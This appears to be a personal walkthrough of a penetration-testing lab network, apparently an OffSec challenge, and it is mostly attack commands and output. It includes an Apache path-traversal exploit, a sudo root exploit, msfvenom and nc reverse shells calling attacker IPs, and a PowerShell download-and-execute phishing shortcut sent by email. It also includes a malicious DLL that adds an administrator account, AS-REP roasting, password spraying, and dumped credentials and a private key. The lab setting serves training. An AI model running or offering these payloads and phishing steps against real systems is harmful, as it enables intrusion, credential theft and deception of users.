
### Scan the network

```

# Scan the network with nmap
db_nmap -sn 192.168.244.0/24 -oN nmap.public
db_nmap -sS -sV --top-ports 10000 -iL info/targets.txt

# 80
192.168.244.191  80    tcp    http  open    Microsoft IIS httpd 10.0
192.168.244.245  80    tcp    http  open    Apache httpd 2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
192.168.244.246  80    tcp    http  open    Apache httpd 2.4.52 (Ubuntu)
192.168.244.247  80    tcp    http  open    Apache httpd 2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
192.168.244.248  80    tcp    http  open    Microsoft IIS httpd 10.0
192.168.244.249  80    tcp    http  open    Microsoft IIS httpd 10.0

# 443 
192.168.244.245  443   tcp    ssl/http  open    Apache httpd 2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
192.168.244.246  443   tcp    ssl/http  open    Apache httpd 2.4.52 (Ubuntu)
192.168.244.247  443   tcp    ssl/http  open    Apache httpd 2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10

# 8000
192.168.244.245  8000  tcp    http  open   Apache httpd 2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
192.168.244.249  8000  tcp    http  open   Apache httpd 2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30

# 21
192.168.244.245  21    tcp    ftp   open   vsftpd 2.0.8 or later

# 445
192.168.244.189  445   tcp    microsoft-ds  open
192.168.244.191  445   tcp    microsoft-ds  open
192.168.244.247  445   tcp    microsoft-ds  open
192.168.244.248  445   tcp    microsoft-ds  open
192.168.244.249  445   tcp    microsoft-ds  open
192.168.244.250  445   tcp    microsoft-ds  open



```

### .191

```

# port 80 open but requires auth to access (basic auth)
# Tried to brute with hydra both with basic creds and discovered creds

# Was possible to RDP from creds found at .14
xfreerdp /dynamic-resolution +clipboard /drive:data,/tmp /cert:ignore /v:192.168.171.191 /u:dmzadmin /p:SlimGodhoodMope

# Found proof.txt on desktop


```


### .245

```bash

# Looking at FTP
ftp 192.168.244.245
	anonymous
	anonymous
	
# Sucessfull login but the dir is empty
# Maybe can be usefull if I need to upload or something
# Banner: 220 RELIA Edge FTP server
# Version vsftpd vsFTPd 3.0.3

# There is a known exploit to get remote shell, tried with msf but no success (3.0.3 not affected)
unix/ftp/vsftpd_234_backdoor
	[*] 192.168.244.245:21 - Banner: 220 RELIA Edge FTP server.
	[*] 192.168.244.245:21 - USER: 331 Please specify the password.
	[*] Exploit completed, but no session was created.

# Looking at HTTP
whatweb http://192.168.244.245
Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8]

# Path traversal vuln
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)  | 50383
cp /usr/share/exploitdb/exploits/multiple/webapps/50383.sh .
./50383.sh info/targets.txt /etc/passwd
192.168.244.245
miranda:x:1001:1001:Miranda:/home/miranda:/bin/sh
steven:x:1002:1002:Steven:/home/steven:/bin/sh
mark:x:1003:1003:Mark:/home/mark:/bin/sh
anita:x:1004:1004:Anita:/home/anita:/bin/sh
offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash

# Save users to usernames.txt
# Can't get RCE, dead end?

# Fuzz directories
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://192.168.244.245/FUZZ

# Can't find any intresting directories or in parameters
# Come back to path traversal vuln later..

# Managed to find ssh private key
# NOTE that not all SSH keys are named id_rsa!!
./50383.sh 192.168.244.245.txt /home/anita/.ssh/id_ecdsa

# Save the key and change priv on file
chmod 600 info/anita.ssh

# Asks for a password
ssh anita@192.168.244.245 -i id_rsa -p 2222

# Crack the password with john
ssh2john id_rsa >> id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
	fireball
	
# Possible to SSH to both .245 and .246
	ssh anita@192.168.244.245 -i id_rsa -p 2222
	ssh anita@192.168.244.246 -i id_rsa -p 2222
	
# PRIV ESCALATION

# Run linpeas
	Sudo version 1.8.31
	
# Sudo seems like it is outdated and vulnerable
# Tried multiple exploits and managed to find a working one after a LONG while...
https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py
python3 exploit.nss.py

# Run linpeas again as root
identity: {hostname: web01, password: $6$p6n32TS.3/wDw7ax$TNwiUYnzlmx7Q0w59MbhSRjqW37W20OpGs/fCRJ3XiffbBVQuZTwtGeIJglRJg0F0vFKNBT39a57gakRJ2zPw/,

# Get shadow files for other users

offsec:$6$p6n32TS.3/wDw7ax$TNwiUYnzlmx7Q0w59MbhSRjqW37W20OpGs/fCRJ3XiffbBVQuZTwtGeIJglRJg0F0vFKNBT39a57gakRJ2zPw/:19277:0:99999:7:::
offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash

miranda:$6$01GOUNyvP1lFg0Id$QoFsKEsD4um4ctVU62MU/KEmQbdj0OSw7gJ6EXVA4YTjTNxvfzQxdhdsyjHUaw4qO0YAwEMoXUXWBdCd3zW4V.:19277:0:99999:7:::
miranda:x:1001:1001:Miranda:/home/miranda:/bin/sh

steven:$6$Rj4tu27TLjcnwC2v$wsNuqImPdduB9mXZHpjjEROvTKwWsp2SckcMB.AtcvHyS7tHTCGh.CrUCP0ogsFH9IjG3i2qekcAXRlkmeZOT1:19277:0:99999:7:::
steven:x:1002:1002:Steven:/home/steven:/bin/sh

mark:$6$blWxRVRno5YcdGiN$6ekTTBXDvGfaFRSPxZVLhR8tAmFd20RLlXNL5Q8U44gp0Heq7MLmFZrlaHeaX.pFhlJ3lif10E1zsO3W2tdbC/:19277:0:99999:7:::
mark:x:1003:1003:Mark:/home/mark:/bin/sh

anita:$6$Fq6VqZ4n0zxZ9Jh8$4gcSpNrlib60CDuGIHpPZVT0g/CeVDV0jR3fkOC7zIEaWEsnkcQfKp8YVCaZdGFvaEsHCuYHbALFn49meC.Rj1:19277:0:99999:7:::
anita:x:1004:1004:Anita:/home/anita:/bin/sh



```

### .246

```

# SSH
ssh anita@192.168.244.246 -i id_rsa -p 2222

# Run linpeas
	Linux Exploit Suggester
		Suggests a bunch of exploits
			Check em out if nothing else shows

	/var/www/html/error.log
	/var/www/html/access.log
	/etc/apache2/sites-enabled/internal-app.conf 
	/var/lib/php/sessions
	/var/crash/test.php

	SGID
		-rwxr-sr-x 1 root tty 23K Feb 21  2022 /usr/bin/write.ul (Unknown SGID binary)
	
	127.0.0.1:8000

```

### Lets investigate the internal http server

```

# Create an ssh port forward
ssh -L 8001:localhost:8000 -N -f -l anita -p 2222 -i id_rsa 192.168.244.246

# Visit the site at 127.0.0.1:8001 in the browser

# Fuzz
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://127.0.0.1:8001/FUZZ

# Found login page at:
http://127.0.0.1:8001/backend/?view=user.inc

# LFI
/backend/?view=/../../../../../etc/passwd

# Since I have SSH connection I can find a directory that is writeable and execute a shell from the web app
find / -writable -type d 2>/dev/null

# Create a file for writeable directories
cat targetDir.txt
	/var/tmp
	/var/crash
	...
	
# Create a script that cp a test file to all writeable dirs
	#/bin/bash

	cat targetDir.txt | while read line
	do
		cp test.txt $line/
		ls -l $line/test.txt
	done

# Try to access the file through the web app

# Found /var/crash
# Create a rev shell with msfvenom (unstable shell)
msfvenom -p php/reverse_php LHOST=192.168.45.186 LPORT=5555 -f raw -o revshell.php

nc -nvlp 5555

# www-data user has sudo access
sudo cat /root/proof.txt

```

### .247

```bash

whatweb
	Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
	
# Info disclousre at
http://192.168.244.247/dashboard/phpinfo.php

# Has Filezilla exposed on port 14020
ftp 192.168.166.247 14020
	anonymous
	anonymous
	
# Found file with username & password
	mget umbraco.pdf
		mark (@relia.com)
		pass "OathDeeplyReprieve91"

# Add to creds, username and password

# Tried running netexec on all targets
	192.168.166.248 445 	EXTERNAL   	 EXTERNAL\mark@relia.com:OathDeeplyReprieve91 (Guest)
	# See .248 

# Check nmap scan again and all http servers
# NOTE TO SELF Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) CAN BE RELEVANT!!

# Add hostname to /etc/hosts
192.168.171.247	web02.relia.com

# Search for exploits against umbraco
searchsploit umbraco

# Set up nc listener and execute payload
python3 49488.py -u mark@relia.com -p 'OathDeeplyReprieve91' -i http://web02.relia.com:14080/ -c powershell.exe -a '-e JABjAG..'

# Check priv of user
whoami /priv
	SeImpersonatePrivilege        Impersonate a client after authentication Enabled
	
# Tried running printspoofer, did not work
# Tried godPotato and it worked
# REMEBER TO TRY MULTIPLE EXPLOITS!!
./godpotato.exe -cmd "C:\users\adrian\desktop\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.216 1234"

cat proof.txt
	18c15b5b5bf1d99fef07f0f84bac0c0c




```

### .248

- Port 80: 
	- Welcome to your new DNN® installation! DNN® makes it easy for you to install and use the DNN® Platform. We have multiple options to suit your needs, whether you want to try the CMS out in the cloud, install it on your own server, or use it on your desktop for development. You are just a click away from getting started with DNN®.


```bash

# Login page can log in with basic creds
	admin:password

# Found user emma@relia.com (Try to do an phising attack against the mail server)
	SuperUser Account
	
# Possible to upload profile picture (Come back and try to upload malicous file)

# Feels like I am supposed to do a phishing attack from here
	"Ways to Get in Touch: Email emma@relia.com"

# Requires that we get password to a domain connected user, I don't have the password of the user anita yet!


# SMB partly accessible as user mark (Guest)
netexec smb 192.168.166.248 -u mark@relia.com -p OathDeeplyReprieve91 --shares
	Transfers
	Users
	
# Found .kdbx file in Transfers at:
	\DB-back (1)\New Folder\Emma\Documents\Database.kdbx>
	
# crack it with hashcat
	keepass2john Database.kdbx > database.hash
# Remove the "Database:" from the begining of the file
cat database.hash
hashcat -h | grep -i keepass

# Run hashcat and found password
hashcat -m 13400 database.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
	welcome1
	
# Found some password in the .kdbx file, most intresting:
	emma:SomersetVinyl1!

# Add to info/

# Possible to RDP in to .248
xfreerdp /dynamic-resolution +clipboard /drive:data,/tmp /cert:ignore /v:192.168.171.248 /u:emma /p:'SomersetVinyl1!'

# Found shedueled task
Get-Scheduledtask
	\         BetaTask      Ready
cat C:\BetaMonitor\betaMonitor.log
	[2024-07-30_01:03:42.3479] Coudlnt find BetaLibrary.Dll.

# Tried to cpy revshell dll to path dir since I don't have write rights to the dir but did not work

# RABBIT HOLE!

# Look at env variables, in cmd:
SET
	AppKey=!8@aBRBYdb3!
	
# Login with mark:!8@aBRBYdb3!
cat .\proof.txt
	9ce36a5d77494457a7f618e84ae6f210
	
```

### .249

```

# Found port 80 and 8000 open
# Port 80 seems to be a dead end

# FUZZ 8000 and found /cms
# Log in with admin:admin
# Found it possible to upload files
https://www.exploit-db.com/exploits/50616

# Create a php reverse shell
msfvenom -p php/reverse_php LHOST=192.168.45.154 LPORT=5555 -f raw -o revshell.php

# Visit the site
http://192.168.171.249:8000/cms/files/revshell.php

# Create a more stabilized shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.154 LPORT=4444 -f exe -o revshell.exe
# upload and run in from cmd

# Found local.txt
cat local.txt
	e06203d6f501e8cc6fd4af164ee2fa53
	
# Check privs
whoami /all
	SeImpersonatePrivilege        Impersonate a client after authentication Enabled
	
# Run godpotato
C:\users\adrian\desktop> ./godpotato.exe -cmd "C:\users\adrian\desktop\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.154 1234"

# The shell is super un-stable and cant run all commands
# Not possible to run a new reverse shell for some reason tried multiple payloads
# If the host has RDP active you can create a new user and add to admin
net user test password123 /add
net localgroup administrators test /add

# RDP in to the host
# You can also RDP in to the host using damon creds
xfreerdp /dynamic-resolution +clipboard /drive:data,/tmp /cert:ignore /v:192.168.171.249 /u:"test" /p:'password123'

# Check PS hsitory file
((Get-PSReadlineOption).HistorySavePath)
cat C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat C:\Users\administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Enumerate C:\staging\.git
ls -force C:\staging\

# Check logs
git log
	-Email configuration of the CMS
	-maildmz@relia.com:DPuBT9tGCBrTbR
	-If something breaks contact jim@relia.com as he is responsible for the mail server.
	-Please don't send any office or executable attachments as they get filtered out for security reasons.
	
# Seems like next step is phishing

# Add creds to /info

```


### .189 (MAIL)

```bash

# Lets set up a webdav server
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/Projects/Offsec/Challenges/Relia/webdav

# Create a file called config.Library-ms on Windows and transfer to Kali
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://INSERT_IP</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
 
# Create a shortcut on windows and transfer to Kali
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.222:8000/powercat.ps1'); powercat -c 192.168.45.222 -p 4444 -e powershell"
 
# Start a webserver to serve powercat
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 8000
 
# Start a nc in a new window
nc -nvlp 4444
 
# Create a phising email and send it via the tool swaks
# Creata a file body.txt
-----
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. Ill remove it for security reasons.
 
On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!
 
John
-----
 
# Send the email as the maildmz user we previously pwned to jim
sudo swaks -t jim@relia.com --from maildmz@relia.com  --attach @config.Library-ms --server 192.168.171.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
username: maildmz
password: DPuBT9tGCBrTbR
 
# Reverseshell BOOM!
whoami
	relia\jim
hostname
	WK01
ipconfig
   IPv4 Address. . . . . . . . . . . : 172.16.131.14
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.131.254
 
# We notice that we have an internal IP, indicating we are on the internal network

# Still no access to the actual mail server

# Possible to auth with creds Administrator:vau!XCKjNQBv2$
impacket-psexec relia.com/Administrator:vau\!XCKjNQBv2\$@192.168.171.189

# Found proof.txt
type C:\Users\administrator\desktop\proof.txt
13d7bc86e13b2933b9ea229099e89ca3


```

&nbsp;

## Internal
### .14 (WK01)


```bash

# Set up the Ligolo tunnel network on Kali
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

# Start the proxy
./proxy -selfcert -laddr 0.0.0.0:443 

# Transfer the agent to the target and connect to the proxy
iwr 192.168.45.180:8000/agent.exe -outfile agent.exe
.\agent.exe -connect 192.168.45.216:443 -ignore-cert

# Start the connection in ligolo
session
ifconfig
start

# Check that the interface is up
ip a show ligolo

# Add IP to routing table on Kali
sudo ip route add 10.10.174.0/24 dev ligolo

# You can now run any commands against the internal network!

# Found local.txt
type C:\users\jim\desktop\local.txt
	48d79e534a54eb7d8530cd1e4e8732f6
	
# Do enum & priv esc

# Found database.kdbx
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
	C:\Users\jim\Documents\database.kdbx
	
# Transfer the file and crack it
iwr 192.168.45.222:8000/powercat.ps1 -outfile powercat.ps1
import-module .\powercat.ps1
$kali nc -nvlp 1234 > database.kdbx
powercat -c 192.168.45.222 -p 1234 -i C:\Users\jim\Documents\Database.kdbx

keepass2john database.kdbx > database.hash
hashcat -h | grep -i keepass
hashcat -m 13400 database.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
	mercedes1

# It was possible to read proof.txt all along..
cat C:\Users\Offsec\desktop\proof.txt
	11afd19c5d1537abc7c43c6d48ba074c



```


### Enumerate internal network

```bash

# Scan for the most common ports open
nmap -Pn --top-ports 20 172.16.131.0/24 -oG network-id.internal --open
grep open network-id.internal | cut -d " " -f 2

# Can aldo do a ping sweep but does not seem as reliable
nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt

# Save down the targets to a file and make a complete nmap scan
sudo nmap -p- -sS -sV -oN nmap.internal -iL info/targets.internal

# Password spray with netexec against smb and winrm
# SMB shares
	SMB         172.16.131.6    445    DC02             NETLOGON        READ            Logon server share 
	SMB         172.16.131.6    445    DC02             SYSVOL          READ            Logon server share 

	SMB         172.16.131.21   445    FILES            apps            READ   

```

### .6 (DC02)

```bash

# Try common attacks against the AD/DC
# AS-REP roasting
impacket-GetNPUsers -dc-ip 172.16.131.6  -request -outputfile hashes.asreproast relia.com/jim
	michelle  CN=INTRANETRDP,CN=Users,DC=relia,DC=com
	$krb5asrep$23$michelle@RELIA.COM:cc7b43bdccb09d9ed95ee1132228a95f$7783e1ac318a50040757b582f03d962920f6781919057ededa5a7bfc888c16ac3209e26e610b696128ec20904f6eb93c5198a763b48cebfd082202a376fe86afb644c13d7976411648d84db1b97f0cfeffcf3329257d26844fb8168f9fd3c404d2d7fd9c31ad6656c7d8a04a6649a2dfc9011de2561916d16f119438797d9712e6c219e2c5df0c652646e389845a33caff55a89ab72909d2c0b3c387702c0b4d390a2eeee257959530a25094a71c734d3048e479693b503aec54a2c5755ae9e7be5165e9261c6631f0e88214922d18539878c9a5b5922a599659f43ede6d38ddc894bf32bd96
	
# Crack the hash
hashcat -h | grep -i as-rep
hashcat -m 18200 michelle.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
	NotMyPassword0k?
	
# Add to /info

# Spray all targets with michelles creds
netexec smb info/targets.internal -u michelle -p 'NotMyPassword0k?'
netexec winrm info/targets.internal -u michelle -p 'NotMyPassword0k?'
netexec ssh info/targets.internal -u michelle -p 'NotMyPassword0k?'
netexec rdp info/targets.internal -u michelle -p 'NotMyPassword0k?'
netexec ftp info/targets.internal -u michelle -p 'NotMyPassword0k?'

# Kerberoasting (Not sucessfull!!)
impacket-GetUserSPNs -dc-ip 172.16.131.6  -request -outputfile hashes.asreproast relia.com/jim

# Found creds from .21
impacket-psexec relia/Administrator:vau\!XCKjNQBv2\$@172.16.131.6

# found proof.txt
cat proof.txt
	a02aee8a6e103d4015cd84042d82dc57


```

### .7 (INTRANET)

```bash

# Found wordpress site @ 
http://intranet.relia.com/wordpress/wp-login.php

# Had to add intranet.relia.com to /etc/hosts

# Trying to login with admin:admin gives error msg
	Error: The password you entered for the username admin is incorrect. 

# Trying to brute force the login
#	No success, dead end?

# Possible to RDP with michelle:NotMyPassword0k?
xfreerdp /dynamic-resolution +clipboard /drive:data,/tmp /cert:ignore /v:172.16.131.7 /u:michelle /p:'NotMyPassword0k?'

# Found local.txt

# Do privEsc

# Check installed software
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
	XAMPP

# Found C:\Scheduler\scheduler.exe
# I have no write rights so can't do service hijacking
# Copy the file to windows to analyze with procmon to see if I can replace any DLLs


```

### DLL hijacking (.7)

- Simply running the .exe gives the following error message:
	- ![49922e8518b8144fc7909ad70f94f0f2.png](../../../_resources/49922e8518b8144fc7909ad70f94f0f2.png)
- Filter for procmon
	- ![042cbe8b8c94c81999e0a9b3d000b506.png](../../../_resources/042cbe8b8c94c81999e0a9b3d000b506.png)
- Missing DLL
	- ![9cea57bbc20d31fed5735d55488272ee.png](../../../_resources/9cea57bbc20d31fed5735d55488272ee.png)

```

# Start procmon

# To solve the error msg create a new service process
# Run powershell as admin
sc.exe create scheduler binPath= "C:\Scheduler\scheduler.exe"
net start scheduler

# Insert the filters shown

# Compile the payload
x86_64-w64-mingw32-gcc payload.cpp --shared -o payload.dll

# Find a writeable path and insert malicious beyondhelper.dll
C:\Scheduler\

# Restart the service
Restart-Service BetaService

# Check if a new user was created
net user
	test
	
# RDP in to the new user
# Did not work..

# Create a new payload with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.222 LPORT=4455 -f dll -o revshell.dll

# Found proof.txt
cat proof.txt
	342b9de5b0655bdc4a5a15b59035072a

# Do enumeration


```

### Malicious payload (.7)
```C++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user test password123! /add");
  	    i = system ("net localgroup administrators test /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}

```


### .15 (WK02)

```bash

# Possible to RDP in to the target using andrea creds
netexec rdp info/targets.internal -u andrea -p PasswordPassword_6
RDP         172.16.131.15   3389   WK02             [+] relia.com\andrea:PasswordPassword_6 (Pwn3d!)

xfreerdp /dynamic-resolution +clipboard /drive:data,/tmp /cert:ignore /v:172.16.131.15 /u:andrea /p:'PasswordPassword_6'

# Found C:\schedule.ps1
# Does some copying of a file updatecollector
# Simply change the .ps1 file code and insert a reverse shell

# Gained access as milana
cat proof.txt
	290454fef22a35e1324125537a495c4c

# Found database.kdbx
# Cracked the file and found a ssh private key for sarah
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAwAAAJgtoEZgLaBG
YAAAAAtzc2gtZWQyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAw
AAAECk3NMSFKJMauIwp/DPYEhMV4980aMdDOlfIlTq3qy4SkSFGA7D4B3Cvr5H8Dng2Dvl
YrVWwfV/7GWhjAhsWegDAAAADnRlc3RzQGhhdC13b3JrAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----

# Try to login to exposed ssh (SUCCESS!!)
ssh sarah@172.16.131.19 -i sarah.private


```


### .19 (backup)

```bash

# SSH in to .19 with sarah private key
ssh sarah@172.16.131.19 -i sarah.private

# Found local.txt

# Check sudo -l		(Altough I don't have sarahas password)
User sarah may run the following commands on backup:
    (ALL) NOPASSWD: /usr/bin/borg list *
    (ALL) NOPASSWD: /usr/bin/borg extract *
    (ALL) NOPASSWD: /usr/bin/borg mount *

# Check for files named borg
find / -name *borg* 2>/dev/null
/opt/borgbackup/

# Try to run /usr/bin/borg list * gives error msg
/opt/borgbackup/ is not a valid repository. Check repo config.

# Was required to stand in opt and it worked
sudo /usr/bin/borg list *
	Enter passphrase for key /opt/borgbackup:

# Run pspy64 to look at running processes
./pspy64 -pf -i 1000 > processes.txt

# grep for borg
cat processes.txt | grep -i borg
# Found a borg passphrase
BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA'

# Run the sudo /usr/bin/borg list * again
home        Mon, 2022-10-17 22:29:47 [680a2d...

# Extract the home archive
sudo /usr/bin/borg extract borgbackup::home

# Run again with --stdout (write all extracted data to stdout)
sudo /usr/bin/borg extract --stdout borgbackup::home
# Seems to print bashrc
mesg n 2> /dev/null || true
sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
{
    "user": "amy",
    "pass": "0814b6b7f0de51ecf54ca5b6e6e612bf"

# Crack MD5 hash
0814b6b7f0de51ecf54ca5b6e6e612bf = backups1

# switch user to amy
su amy
	backups1
	
# found proof.txt
sudo cat /root/proof.txt
	7767de7098d5c7f514c55685a12f32b3


```

### .20

```bash

# SSH with andrew
ssh andrew@172.16.131.20
	Rb9kNokjDsjYyH

# Run linpeas (Did not identify any OPEN PORTS SINCE IT FREEBSD, USE NETSTAT!!)
/usr/local/www/apache24/data/phpMyAdmin/vendor/paragonie/sodium_compat/.github

SUID
/usr/local/bin/doasedit (Unknown SUID binary!)
/usr/local/bin/vidoas (Unknown SUID binary!)

Modified files last 5 min
/tmp/vuln.xml.T1qbvLkvUM
/tmp/periodic.enSBDoS2dq

# Find doas files
find / -name *doas* 2>/dev/null
	/usr/local/etc/doas.conf
		permit nopass andrew as root cmd service args apache24 onestart
		
# Run doas
doas -u root service apache24 onestart
	Starting apache24.
	
# Look for apache24 files
find / -name *apache24* 2>/dev/null

# Look for open ports using netstat (DID NOT SHOW IN LINPEAS)
netstat -aln
	9000
	3306

# Look for writeable folders
find / -perm -222 -type d 2>/dev/null
	/usr/local/www/apache24/data/phpMyAdmin/tmp
	
# Upload malicius php shell
msfvenom -p php/reverse_php LHOST=192.168.45.222 LPORT=5555 -f raw -o revshell.php

# Visit the site
nc -nvlp 5555
172.16.131.20/phpMyAdmin/tmp/revshell.php

# Get a stabalized shell
msfvenom -p bsd/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f elf -o shell.elf
nc -nvlp 666
./revshell.elf

# Found proof.txt		(www is part of the "root wheel")
cat /root/proof.txt
	dac402cbc36c006b04009e7f725a20e2

# Run linpeas again

# Must get access to history file in mountuser somehow?

# possible to simply run doas again
doas bash
whoami
	root

# Read file mountuser history
cat .history
sshpass -p "DRtajyCwcbWvH/9" ssh mountuser@172.16.10.21

# Possible read smb shares with creds


```

### .21

```

# List the SMB share
netexec smb 172.16.131.21 -u "mountuser" -p "DRtajyCwcbWvH/9" --shares
SMB         172.16.131.21   445    FILES            apps            READ            
SMB         172.16.131.21   445    FILES            C$                              Default share
SMB         172.16.131.21   445    FILES            IPC$            READ            Remote IPC
SMB         172.16.131.21   445    FILES            monitoring      READ            
SMB         172.16.131.21   445    FILES            scripts         READ

# Enumerate the shares
netexec smb 172.16.131.21 -u mountuser -p 'DRtajyCwcbWvH/9' -M spider_plus

# Go through the files in scripts and monitoring
smbclient -p 445 //172.16.131.21/monitoring -U mountuser@relia.com --password='DRtajyCwcbWvH/9'
mget *
cat * | grep -i pass
	PS C:\Users\Administrator> $spass = ConvertTo-SecureString "vau!XCKjNQBv2$" -AsPlaintext -Force
	
# Add creds to /info

# Use psexec with creds found
impacket-psexec relia/Administrator:vau\!XCKjNQBv2\$@172.16.131.21

# Found proof.txt
cat proof.txt
	85c482428fdf5cf1caa1c3b274e76596


```

### 30

```bash

# Use Administrator:vau!XCKjNQBv2$ with psexec
impacket-psexec relia/Administrator:vau\!XCKjNQBv2\$@172.16.131.30

# Found proof.txt
cat proof.txt
	ce790add15ce7a6a686520c433a5a718


```


# ALL FUCKING DONE!!